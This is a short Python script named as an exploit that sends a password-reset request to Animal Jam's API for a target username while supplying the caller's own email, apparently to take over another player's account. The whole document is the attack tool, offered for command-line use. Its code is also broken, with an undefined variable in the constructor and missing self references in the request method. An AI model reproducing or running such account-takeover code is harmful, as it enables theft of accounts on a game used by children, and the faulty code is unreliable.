import requests, sys

class Exploit:

    def __init__(self, username, email):
        self.username = token
        self.email = email

    def execute(self):
        endpoint = f'https://api.animaljam.com/game_account/{username}/send_password_reset/desktop'
        return requests.post(url=endpoint, data={'email': email, 'user_name': username}, headers={'auth': 'null'})

def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <USERNAME> <YOUR_EMAIL>')
        sys.exit()

    username = sys.argv[1]
    email = sys.argv[2]

    Exploit(username, email).execute()

if __name__ == '__main__':
    main()
